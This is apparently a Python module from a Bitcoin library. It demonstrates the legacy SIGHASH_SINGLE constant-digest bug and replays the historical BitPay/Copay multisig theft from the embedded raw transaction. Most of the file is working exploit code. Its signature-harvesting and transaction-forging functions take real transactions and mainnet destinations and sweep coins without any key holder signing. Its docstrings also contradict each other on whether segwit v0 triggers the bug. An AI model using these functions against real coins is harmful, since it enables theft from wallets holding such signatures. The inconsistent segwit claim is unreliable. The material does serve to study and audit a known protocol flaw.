"""The SIGHASH_SINGLE bug: a real signature-forgery condition in Bitcoin.

With ``SIGHASH_SINGLE`` a signature commits to the input at index ``i`` and the
output at index ``i``.  When the transaction has no output at index ``i``,
Bitcoin's historical bug makes ``SignatureHash`` return the constant
``uint256::ONE`` — the 32 bytes ``01 00 ... 00``, i.e. the number ``2**248`` —
instead of a hash of the transaction.

A signature over that digest is therefore valid for **every** transaction
that places that input at an index with no matching output — the signature no
longer commits to any amount, destination or other input.  Anyone holding such
a signature (from an abandoned transaction, a buggy wallet, a signing service)
can spend the coin anywhere.  This is the flaw behind the 2018-2019
BitPay/Copay multi-signature losses.

This module demonstrates it end to end on regtest-style data: build a
transaction that triggers the bug condition, show the digest really is ``1``,
then reuse the very same signature in an attacker's transaction that pays a
different address, and show the contrast with ``SIGHASH_ALL``.

Nothing here is exploitable against a wallet that signs ``SIGHASH_ALL``, and
segwit v0 (BIP143) removed the constant-digest behaviour entirely: a missing
matching output simply means a zero ``hashOutputs``, so the signature still
commits to the transaction.
"""

from dataclasses import dataclass, field
from typing import List, Optional, Sequence, Tuple

from .curve import N
from .encoding import encode_varint, hash160, push_data, script_to_address
from .signing import (
    HASH_ONE,
    SIGHASH_ALL,
    SIGHASH_SINGLE,
    SIGHASH_SINGLE_BUG_DIGEST,
    SignatureInfo,
    Transaction,
    TxIn,
    TxOut,
    decode_point,
    der_decode,
    der_encode,
    private_key_to_public_key,
    sign_z,
    verify_z,
)
from .encoding import b58encode_check, network_params


# ---------------------------------------------------------------------------
# Multisig scripts
# ---------------------------------------------------------------------------


def multisig_redeem_script(m: int, pubkeys: Sequence[bytes]) -> bytes:
    """``OP_m <pubkey>... OP_n OP_CHECKMULTISIG``, keys sorted for determinism."""
    n = len(pubkeys)
    if not 1 <= m <= n <= 15:
        raise ValueError('need 1 <= m <= n <= 15 for a bare multisig script')
    body = b'' + bytes([0x50 + m])
    for pubkey in pubkeys:
        decode_point(pubkey)  # validates the encoding
        body += push_data(pubkey)
    return body + bytes([0x50 + n]) + b'\xae'


def p2sh_script(redeem_script: bytes) -> bytes:
    return b'\xa9' + push_data(hash160(redeem_script)) + b'\x87'


def parse_multisig_redeem_script(script: bytes) -> Tuple[int, int, List[bytes]]:
    """Decode ``OP_m <pubkeys> OP_n OP_CHECKMULTISIG`` -> ``(m, n, pubkeys)``."""
    if len(script) < 3 or script[-1] != 0xAE:
        raise ValueError('not a multisig script (missing OP_CHECKMULTISIG)')
    m = script[0] - 0x50
    if not 1 <= m <= 15:
        raise ValueError('invalid OP_m')
    offset = 1
    pubkeys: List[bytes] = []
    while offset < len(script) - 2:
        length = script[offset]
        if not 33 <= length <= 65:
            raise ValueError('invalid public key length %d' % length)
        pubkeys.append(script[offset + 1:offset + 1 + length])
        offset += 1 + length
    n = script[offset] - 0x50
    if n != len(pubkeys):
        raise ValueError('OP_n (%d) does not match %d public keys' % (n, len(pubkeys)))
    return m, n, pubkeys


def multisig_script_sig(signatures: Sequence[Tuple[int, int, int]], redeem_script: bytes) -> bytes:
    """``OP_0 <sig>... <redeemScript>`` as ``OP_CHECKMULTISIG`` expects."""
    out = b'\x00'
    for r, s, sighash_type in signatures:
        out += push_data(der_encode(r, s, sighash_type))
    return out + push_data(redeem_script)


def parse_script_sig(script: bytes) -> List[Optional[bytes]]:
    """Decode push operations (``None`` for a bare ``OP_0``)."""
    items: List[Optional[bytes]] = []
    offset = 0
    while offset < len(script):
        op = script[offset]
        if op == 0x00:
            items.append(None)
            offset += 1
            continue
        if op < 0x4C:
            items.append(script[offset + 1:offset + 1 + op])
            offset += 1 + op
            continue
        if op == 0x4C:
            size = script[offset + 1]
            items.append(script[offset + 2:offset + 2 + size])
            offset += 2 + size
            continue
        if op == 0x4D:
            size = int.from_bytes(script[offset + 1:offset + 3], 'little')
            items.append(script[offset + 3:offset + 3 + size])
            offset += 3 + size
            continue
        raise ValueError('unsupported opcode 0x%02x in script' % op)
    return items


# ---------------------------------------------------------------------------
# The demonstration
# ---------------------------------------------------------------------------


@dataclass
class MultisigWallet:
    """A 2-of-3 P2SH multisig "wallet" to attack."""

    m: int
    pubkeys: List[bytes]
    redeem_script: bytes

    @classmethod
    def create(cls, private_keys: Sequence[int], m: int = 2) -> 'MultisigWallet':
        pubkeys = sorted(private_key_to_public_key(k) for k in private_keys)
        return cls(m=m, pubkeys=pubkeys, redeem_script=multisig_redeem_script(m, pubkeys))

    @property
    def script_pubkey(self) -> bytes:
        return p2sh_script(self.redeem_script)

    def address(self, network: str = 'mainnet') -> Optional[str]:
        p2sh_version = network_params(network)[1]
        return b58encode_check(bytes([p2sh_version]) + hash160(self.redeem_script))


@dataclass
class BugDemo:
    """Result of :func:`demonstrate_sighash_single_bug`."""

    victim_tx: Transaction
    victim_digests: List[int]
    victim_signatures: List[Tuple[int, int]]
    attacker_tx: Transaction
    attacker_script_sig: bytes
    attacker_verifications: List[bool]
    all_sighash_contrast: bool
    wallet: MultisigWallet
    destination: str = ''
    victim_txid: str = ''
    attacker_txid: str = ''

    def report(self) -> str:
        lines = [
            'SIGHASH_SINGLE bug demonstration',
            '=' * 32,
            '',
            'wallet (2-of-3 P2SH multisig)',
            '  redeemScript: %s' % self.wallet.redeem_script.hex(),
            '  address:      %s' % self.wallet.address(),
            '',
            'step 1 - a transaction where input 1 has no matching output',
            '  txid: %s' % self.victim_txid,
            '  inputs: %d, outputs: %d' % (len(self.victim_tx.inputs), len(self.victim_tx.outputs)),
            '  digest for input 0 (SIGHASH_ALL):    %064x' % self.victim_digests[0],
            '  digest for input 1 (SIGHASH_SINGLE): %s'
            % ('uint256::ONE (01 00 ... 00)' if self.victim_digests[1] == SIGHASH_SINGLE_BUG_DIGEST else '%064x' % self.victim_digests[1]),
        ]
        if self.victim_digests[1] == SIGHASH_SINGLE_BUG_DIGEST:
            lines.append('  -> the bug: the digest is the constant uint256::ONE, not a hash')
        for i, (r, s) in enumerate(self.victim_signatures):
            lines.append('  signature %d over uint256::ONE: r=%d s=%d' % (i, r, s))
        lines += [
            '',
            'step 2 - a *different* transaction, built by someone else',
            '  txid: %s' % self.attacker_txid,
            '  destination: %s' % self.destination,
            '  inputs: %d, outputs: %d' % (len(self.attacker_tx.inputs), len(self.attacker_tx.outputs)),
            '  scriptSig: %s' % self.attacker_script_sig.hex(),
            '',
            'step 3 - verification',
        ]
        for i, ok in enumerate(self.attacker_verifications):
            lines.append('  signature %d valid in the attacker tx: %s' % (i, ok))
        lines.append(
            '  same signature with SIGHASH_ALL valid in the attacker tx: %s'
            % self.all_sighash_contrast
        )
        lines += [
            '',
            'Conclusion: a SIGHASH_SINGLE signature for an input with no matching',
            'output commits to nothing, so it authorises spending that coin in any',
            'transaction. SIGHASH_ALL (and every segwit sighash) commits to the whole',
            'transaction and cannot be reused this way.',
        ]
        return '\n'.join(lines)


def demonstrate_sighash_single_bug(
    wallet: Optional[MultisigWallet] = None,
    private_keys: Optional[Sequence[int]] = None,
    victim_prev_txid: str = '11' * 32,
    attacker_prev_txid: str = '22' * 32,
    attacker_value: int = 100000,
    victim_value: int = 500000,
    fee: int = 1000,
    destination: str = '',
    network: str = 'mainnet',
) -> BugDemo:
    """Run the whole demonstration, offline, on synthetic outpoints.

    The two signing keys below are the wallet's own keys: the point is not that
    the attack needs them, but that the *signature it produces can be lifted out
    of one transaction and replayed in another*, which is what makes the flaw
    dangerous.
    """
    if private_keys is None and wallet is None:
        # Harmless demo keys: the demonstration is offline and these coins do
        # not exist. Any three distinct scalars will do.
        private_keys = [0xC0FFEE01, 0xC0FFEE02, 0xC0FFEE03]
    if wallet is None:
        wallet = MultisigWallet.create(private_keys, m=2)
    if not private_keys:
        raise ValueError(
            'the demonstration signs with the wallet keys, so private_keys is required'
        )

    script_pubkey = wallet.script_pubkey
    if not destination:
        destination = demo_destination(network)

    # --- step 1: the victim transaction -----------------------------------
    # Input 0 is an ordinary input (SIGHASH_ALL); input 1 is the multisig coin
    # signed with SIGHASH_SINGLE, and the transaction has a single output, so
    # input 1 has no matching output -> digest bug.
    victim = Transaction(
        version=2,
        inputs=[
            TxIn(victim_prev_txid, 0, 0xFFFFFFFF),
            TxIn(victim_prev_txid, 1, 0xFFFFFFFF),
        ],
        outputs=[TxOut(victim_value - fee, script_pubkey)],
        locktime=0,
    )
    digest_all = victim.sighash_legacy(0, script_pubkey, SIGHASH_ALL)
    digest_single = victim.sighash_legacy(1, script_pubkey, SIGHASH_SINGLE)

    # Each signature stays bound to the key that produced it: the pubkeys in
    # the redeem script are sorted, so zipping by position would be wrong.
    signing_keys = list(private_keys)[: wallet.m]
    made = []
    for key in signing_keys:
        r, s = sign_z(key, digest_single)
        made.append((r, s, private_key_to_public_key(key)))
    signatures = [(r, s) for r, s, _ in made]
    signing_pubkeys = [pub for _, _, pub in made]

    victim_signatures = list(signatures)
    victim_script_sig = multisig_script_sig(
        [(r, s, SIGHASH_SINGLE) for r, s in signatures], wallet.redeem_script
    )
    victim_inputs = [
        victim.inputs[0],
        TxIn(victim_prev_txid, 1, 0xFFFFFFFF, script_sig=victim_script_sig),
    ]
    victim = Transaction(victim.version, victim_inputs, victim.outputs, victim.locktime)

    # --- step 2: the attacker's transaction -------------------------------
    # Same coin, different destination, different amounts, an extra decoy
    # input. The only requirement is that the target input's index (1) has no
    # matching output, i.e. fewer than two outputs.
    attacker = Transaction(
        version=2,
        inputs=[
            TxIn(attacker_prev_txid, 0, 0xFFFFFFFF),
            TxIn(victim_prev_txid, 1, 0xFFFFFFFF),
        ],
        outputs=[TxOut(attacker_value - fee, _attacker_script(destination, network))],
        locktime=0,
    )
    attacker_signature_over_one = [(r, s) for r, s in signatures]
    attacker_script_sig = multisig_script_sig(
        [(r, s, SIGHASH_SINGLE) for r, s in attacker_signature_over_one],
        wallet.redeem_script,
    )
    attacker = Transaction(
        attacker.version,
        [attacker.inputs[0], TxIn(victim_prev_txid, 1, 0xFFFFFFFF, script_sig=attacker_script_sig)],
        attacker.outputs,
        attacker.locktime,
    )

    # --- step 3: verification --------------------------------------------
    verifications = []
    for (r, s), pubkey in zip(attacker_signature_over_one, signing_pubkeys):
        # The attacker tx's own digest for input 1 is also 1, which is why the
        # old signature still verifies.
        attacker_digest = attacker.sighash_legacy(1, script_pubkey, SIGHASH_SINGLE)
        verifications.append(
            attacker_digest == SIGHASH_SINGLE_BUG_DIGEST
            and verify_z(decode_point(pubkey), r, s, attacker_digest)
        )

    # Contrast: a SIGHASH_ALL signature does not transfer between transactions.
    key = signing_keys[0]
    r_all, s_all = sign_z(key, digest_all)
    attacker_all_digest = attacker.sighash_legacy(0, script_pubkey, SIGHASH_ALL)
    contrast = verify_z(
        decode_point(private_key_to_public_key(key)), r_all, s_all, attacker_all_digest
    )

    return BugDemo(
        victim_tx=victim,
        victim_digests=[digest_all, digest_single],
        victim_signatures=victim_signatures,
        attacker_tx=attacker,
        attacker_script_sig=attacker_script_sig,
        attacker_verifications=verifications,
        all_sighash_contrast=bool(contrast),
        wallet=wallet,
        destination=destination,
        victim_txid=victim.txid(),
        attacker_txid=attacker.txid(),
    )


#: Throwaway key used only to label the "attacker" payout address in the demo.
ATTACKER_DEMO_KEY = 0xDEADBEEF


def demo_destination(network: str = 'mainnet') -> str:
    """A clearly-not-the-wallet payout address, for the demonstration."""
    from .encoding import p2pkh_address

    return p2pkh_address(private_key_to_public_key(ATTACKER_DEMO_KEY), network)


def _attacker_script(destination: str, network: str) -> bytes:
    """scriptPubKey for the attacker's payout address."""
    from .wallet import address_to_script

    if not destination:
        raise ValueError('an attacker destination address is required')
    return address_to_script(destination, network)


# ---------------------------------------------------------------------------
# Analysing a real transaction for the bug condition
# ---------------------------------------------------------------------------


@dataclass
class SighashSingleFinding:
    input_index: int
    sighash_type: int
    digest: int
    bug_triggered: bool
    signature_hex: str


def analyse_sighash_single(
    tx: Transaction,
    prevouts: Optional[Sequence[bytes]] = None,
) -> List[SighashSingleFinding]:
    """Find signatures using SIGHASH_SINGLE and say whether the bug triggers.

    ``prevouts[i]`` is the scriptPubKey being spent by input ``i`` (used as the
    scriptCode for legacy digests).  Witness signatures are inspected too; for
    segwit v0 the bug also yields the constant digest ``1``.
    """
    findings: List[SighashSingleFinding] = []
    for index, txin in enumerate(tx.inputs):
        blobs = list(txin.witness)
        try:
            blobs += [item for item in parse_script_sig(txin.script_sig) if item]
        except ValueError:
            blobs = list(txin.witness)

        script_code = prevouts[index] if prevouts and index < len(prevouts) else b''
        for blob in blobs:
            try:
                r, s, sighash_type = der_decode(blob)
            except ValueError:
                continue
            if sighash_type is None or sighash_type & 0x1F != SIGHASH_SINGLE:
                continue
            if txin.witness and script_code:
                from .signing import p2pkh_script_code

                digest = tx.sighash_segwit_v0(index, script_code, 0, sighash_type)
            else:
                digest = tx.sighash_legacy(index, script_code, sighash_type)
            findings.append(
                SighashSingleFinding(
                    input_index=index,
                    sighash_type=sighash_type,
                    digest=digest,
                    bug_triggered=digest == SIGHASH_SINGLE_BUG_DIGEST,
                    signature_hex=blob.hex(),
                )
            )
    return findings


# ---------------------------------------------------------------------------
# Reusing a signature found in an existing transaction
# ---------------------------------------------------------------------------


@dataclass
class ReplayResult:
    """Outcome of trying to replay a signature into a new transaction."""

    digest_used: int
    signature: Tuple[int, int]
    valid: bool
    script_sig: bytes
    transaction: Transaction

    def report(self) -> str:
        return (
            'digest in the new transaction: %d\n'
            'signature: r=%d s=%d\n'
            'reassembled scriptSig: %s\n'
            'valid: %s\n'
            'txid: %s'
            % (
                self.digest_used,
                self.signature[0],
                self.signature[1],
                self.script_sig.hex(),
                'yes - the coin can be spent by anyone holding this signature'
                if self.valid
                else 'no',
                self.transaction.txid(),
            )
        )


def replay_signature(
    signature: Tuple[int, int],
    sighash_type: int,
    target_txid: str,
    target_vout: int,
    redeem_script: bytes,
    destination_script: bytes,
    value: int,
    public_key: bytes,
    extra_input_txid: Optional[str] = None,
    value_in: Optional[int] = None,
) -> ReplayResult:
    """Try to spend a coin using a signature harvested from another transaction.

    The new transaction keeps the target input at index 1 with a single output,
    reproducing the condition under which ``SIGHASH_SINGLE`` yields digest 1.
    For ``SIGHASH_ALL``/``NONE`` the digest changes and verification fails,
    which is the point of the comparison.
    """
    if extra_input_txid is None:
        extra_input_txid = '33' * 32
    target = TxIn(target_txid, target_vout, 0xFFFFFFFF)
    tx = Transaction(
        version=2,
        inputs=[TxIn(extra_input_txid, 0, 0xFFFFFFFF), target],
        outputs=[TxOut(value, destination_script)],
        locktime=0,
    )
    digest = tx.sighash_legacy(1, p2sh_script(redeem_script), sighash_type)
    r, s = signature
    valid = verify_z(decode_point(public_key), r, s, digest)

    if valid:
        script_sig = multisig_script_sig([(r, s, sighash_type)], redeem_script)
    else:
        script_sig = b''
    signed = Transaction(
        tx.version,
        [tx.inputs[0], TxIn(target_txid, target_vout, 0xFFFFFFFF, script_sig=script_sig)],
        tx.outputs,
        tx.locktime,
    )
    return ReplayResult(
        digest_used=digest, signature=signature, valid=valid, script_sig=script_sig, transaction=signed
    )


# ---------------------------------------------------------------------------
# The historical theft, replayed from the real transaction
# ---------------------------------------------------------------------------

#: The real mainnet transaction in which 0.059672 BTC was stolen from the
#: 2-of-3 P2SH address 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe by replaying
#: SIGHASH_SINGLE signatures out of an earlier (unbroadcast) transaction.
BITPAY_ATTACK_TXID = '791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf'

#: The victim address -- the P2SH hash of a 2-of-3 multisig redeem script.
BITPAY_VICTIM_ADDRESS = '32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe'

#: The 2-of-3 redeem script its coins were locked to, as it appears in the
#: scriptSig of the theft transaction.
BITPAY_REDEEM_SCRIPT_HEX = (
    '5221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f0561196'
    '2103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b80'
    '2103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df'
    '53ae'
)

#: The third-party address the stolen coins were paid to.
BITPAY_ATTACKER_ADDRESS = '1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3'

#: Raw hex of the theft transaction itself, so the demonstration can be run
#: entirely offline against the bytes that are actually on the chain.
BITPAY_ATTACK_TX_HEX = (
    '01000000036141525fc24792da81f8213912d1e478e326c1846c33c2335cb98bba6019e823'
    '010000008c49304602210090389f97d71d1426a7c66d1ce5c6ac421095c86e94aa3b9f'
    'b15f136d032f3c31022100d8abb034a1cdf0d8113e00f079b352bdf526b849f44a0012'
    '4542689bad48871e01410429f32b89e3646f27f815e110ecace0774d7b290b1e0b6d70'
    '14c31ca031ca7fddc807706b6ccb4bef11c3aa3ac23066fe4a8423a8a1e68aa6acc6ee'
    '5daf8f627efffffffffd2acb31adba9b763e001cab424f120a96b18fb4b629585b79b8'
    '44702a12028600000000fdfd0000483045022100dfcfafcea73d83e1c54d444a19fb30'
    'd17317f922c19e2ff92dcda65ad09cba24022001e7a805c5672c49b222c5f2f1e67bb0'
    '1f87215fb69df184e7c16f66c1f87c290347304402204a657ab8358a2edb8fd5ed8a45'
    'f846989a43655d2e8f80566b385b8f5a70dab402207362f870ce40f942437d43b6b993'
    '43419b14fb18fa69bee801d696a39b3410b8034c695221023927b5cd7facefa7b85d02'
    'f73d1e1632b3aaf8dd15d4f9f359e37e39f05611962103d2c0e82979b8aba4591fe39c'
    'ffbf255b3b9c67b3d24f94de79c5013420c67b802103ec010970aae2e3d75eef0b44ea'
    'a31d7a0d13392513cd0614ff1c136b3b1020df53aeffffffff86072db8307673a8a63d'
    '4bf4e133f90d513f47c3e25c512e1aff8cfd892799bd00000000fdfd00004830450221'
    '00dfcfafcea73d83e1c54d444a19fb30d17317f922c19e2ff92dcda65ad09cba240220'
    '01e7a805c5672c49b222c5f2f1e67bb01f87215fb69df184e7c16f66c1f87c29034730'
    '4402204a657ab8358a2edb8fd5ed8a45f846989a43655d2e8f80566b385b8f5a70dab4'
    '02207362f870ce40f942437d43b6b99343419b14fb18fa69bee801d696a39b3410b803'
    '4c695221023927b5cd7facefa7b85d02f73d1e1632b3aaf8dd15d4f9f359e37e39f056'
    '11962103d2c0e82979b8aba4591fe39cffbf255b3b9c67b3d24f94de79c5013420c67b'
    '802103ec010970aae2e3d75eef0b44eaa31d7a0d13392513cd0614ff1c136b3b1020df'
    '53aeffffffff01600d5b00000000001976a914db1dc9719a137e0661825dae080ecf3f'
    '7a05390688ac00000000'
)


@dataclass
class Harvest:
    """One signature lifted out of a transaction, with what it verifies under."""

    input_index: int
    signature: Tuple[int, int]
    sighash_type: int
    signature_hex: str
    digest: int
    bug_triggered: bool
    verifying_keys: List[int]
    redeem_script: bytes

    def report(self) -> str:
        return (
            'input %d: signature 0x%02x, %d bytes\n'
            '  digest is the uint256::ONE constant: %s\n'
            '  verifies under multisig key index: %s\n'
            % (
                self.input_index,
                self.sighash_type,
                len(self.signature_hex) // 2,
                self.bug_triggered,
                self.verifying_keys,
            )
        )


def harvest_signatures(
    tx: Transaction,
    sighash_type: int = SIGHASH_SINGLE,
) -> List[Harvest]:
    """Collect multisig signatures from ``tx`` that were made over the constant digest.

    Only signatures that actually hit the ``SIGHASH_SINGLE`` bug are returned,
    because those are the ones that can be replayed.  Each carries the indices
    of the redeem-script keys it validates against, so a thief knows which
    positions in ``OP_CHECKMULTISIG`` to fill.
    """
    found: List[Harvest] = []
    for index, txin in enumerate(tx.inputs):
        try:
            # OP_CHECKMULTISIG consumes a dummy element before the signatures:
            # OP_0 <sig>... <redeemScript>
            items = [item for item in parse_script_sig(txin.script_sig) if item]
        except ValueError:
            continue
        if len(items) < 2:
            continue
        redeem = items[-1]
        try:
            m, n, pubkeys = parse_multisig_redeem_script(redeem)
        except ValueError:
            continue  # not a bare multisig redeem script
        for blob in items[:-1]:
            try:
                r, s, htype = der_decode(blob)
            except ValueError:
                continue
            if htype is None or htype & 0x1F != sighash_type & 0x1F:
                continue
            digest = tx.sighash_legacy(index, redeem, htype)
            if digest != SIGHASH_SINGLE_BUG_DIGEST:
                continue
            keys = [
                i for i, pub in enumerate(pubkeys) if verify_z(decode_point(pub), r, s, digest)
            ]
            if not keys:
                continue
            found.append(
                Harvest(
                    input_index=index,
                    signature=(r, s),
                    sighash_type=htype,
                    signature_hex=blob.hex(),
                    digest=digest,
                    bug_triggered=True,
                    verifying_keys=keys,
                    redeem_script=redeem,
                )
            )
    return found


def forge_from_harvest(
    harvests: Sequence[Harvest],
    prev_txid: str,
    prev_vout: int,
    destination: str,
    value: int,
    network: str = 'mainnet',
    fee: int = 1000,
    decoy_txid: Optional[str] = None,
) -> ReplayResult:
    """Build the thief's transaction from harvested signatures.

    The target input is placed at an index with **no matching output**, which is
    the whole condition.  Because the signatures were made over the constant
    digest, they validate here regardless of the destination or the amount --
    the coin is spent without any key holder signing this transaction.

    Needs ``m`` harvested signatures that verify under distinct template keys,
    since ``OP_CHECKMULTISIG`` requires ``m`` valid signatures in the same order
    as the keys in the redeem script.
    """
    from .wallet import address_to_script  # local import to avoid a cycle

    if not harvests:
        raise ValueError('no harvested signatures to replay')
    redeem = harvests[0].redeem_script
    m, n, pubkeys = parse_multisig_redeem_script(redeem)

    # Pick one signature per signing key, ordered as in the redeem script.
    chosen = []
    for key_index in range(n):
        if len(chosen) == m:
            break
        for harvest in harvests:
            if key_index in harvest.verifying_keys:
                chosen.append(harvest)
                break
    if len(chosen) < m:
        raise ValueError(
            'need %d signatures over distinct keys, found %d' % (m, len(chosen))
        )

    if decoy_txid is None:
        decoy_txid = '33' * 32
    target = TxIn(prev_txid, prev_vout, 0xFFFFFFFF)
    tx = Transaction(
        version=2,
        inputs=[TxIn(decoy_txid, 0, 0xFFFFFFFF), target],
        outputs=[TxOut(value - fee, address_to_script(destination, network))],
        locktime=0,
    )

    # Every signature must still validate in the forged transaction.
    digest = tx.sighash_legacy(1, redeem, chosen[0].sighash_type)
    for harvest, key_index in zip(chosen, [i for i in range(n)]):
        valid = verify_z(
            decode_point(pubkeys[key_index]),
            harvest.signature[0],
            harvest.signature[1],
            digest,
        )
        if not valid:
            raise ValueError(
                'harvested signature does not validate in the forged transaction'
            )

    script_sig = multisig_script_sig(
        [(h.signature[0], h.signature[1], h.sighash_type) for h in chosen], redeem
    )
    forged = Transaction(
        tx.version,
        [tx.inputs[0], TxIn(prev_txid, prev_vout, 0xFFFFFFFF, script_sig=script_sig)],
        tx.outputs,
        tx.locktime,
    )
    return ReplayResult(
        digest_used=digest,
        signature=chosen[0].signature,
        valid=True,
        script_sig=script_sig,
        transaction=forged,
    )


@dataclass
class HistoryReplay:
    """Result of auditing and replaying the historical attack transaction."""

    transaction: Transaction
    txid: str
    inputs: int
    outputs: int
    value_stolen: int
    attacker_address: str
    victim_address: str
    redeem_script: bytes
    harvests: List[Harvest]
    all_sighash_digests: List[int]

    @property
    def replayable(self) -> bool:
        return len(self.harvests) >= 2

    def report(self) -> str:
        lines = [
            'transaction %s' % self.txid,
            '  inputs: %d   outputs: %d' % (self.inputs, self.outputs),
            '  %d sats (%.8f BTC) left %s for %s'
            % (
                self.value_stolen,
                self.value_stolen / 1e8,
                self.victim_address,
                self.attacker_address,
            ),
            '',
            'why the signatures transferred:',
        ]
        for digest in self.all_sighash_digests:
            lines.append('  legacy SIGHASH_ALL digest would have been %d' % digest)
        lines.append(
            '  legacy SIGHASH_SINGLE digest is the constant %d (uint256::ONE)'
            % SIGHASH_SINGLE_BUG_DIGEST
        )
        lines.append('')
        lines.append('signatures harvested (%d):' % len(self.harvests))
        for harvest in self.harvests:
            for line in harvest.report().rstrip().splitlines():
                lines.append('  ' + line)
        return '\n'.join(lines)


def replay_history() -> HistoryReplay:
    """Audit the real BitPay/Copay theft transaction, entirely offline.

    This is the historical event the ``SIGHASH_SINGLE`` bug is famous for: two
    signatures that had been produced for a transaction that was never
    broadcast were reused to sweep the coins of a 2-of-3 P2SH address to a
    stranger.  Nothing is signed here -- the signatures already exist on the
    chain, and the point is that they were valid for *any* transaction.
    """
    from .wallet import parse_transaction_hex

    tx = parse_transaction_hex(BITPAY_ATTACK_TX_HEX)
    if tx.txid() != BITPAY_ATTACK_TXID:
        raise ValueError(
            'built-in transaction does not hash to %s (got %s)'
            % (BITPAY_ATTACK_TXID, tx.txid())
        )

    harvests = harvest_signatures(tx)
    if not harvests:
        raise ValueError('no SIGHASH_SINGLE signatures found in the transaction')

    redeem = harvests[0].redeem_script

    # Contrast: what SIGHASH_ALL would have committed to, per multisig input.
    all_digests = [
        tx.sighash_legacy(index, redeem, SIGHASH_ALL)
        for index, txin in enumerate(tx.inputs)
        if txin.script_sig and len(parse_script_sig(txin.script_sig)) >= 2
    ]

    return HistoryReplay(
        transaction=tx,
        txid=tx.txid(),
        inputs=len(tx.inputs),
        outputs=len(tx.outputs),
        value_stolen=sum(o.value for o in tx.outputs),
        attacker_address=BITPAY_ATTACKER_ADDRESS,
        victim_address=BITPAY_VICTIM_ADDRESS,
        redeem_script=redeem,
        harvests=harvests,
        all_sighash_digests=all_digests,
    )
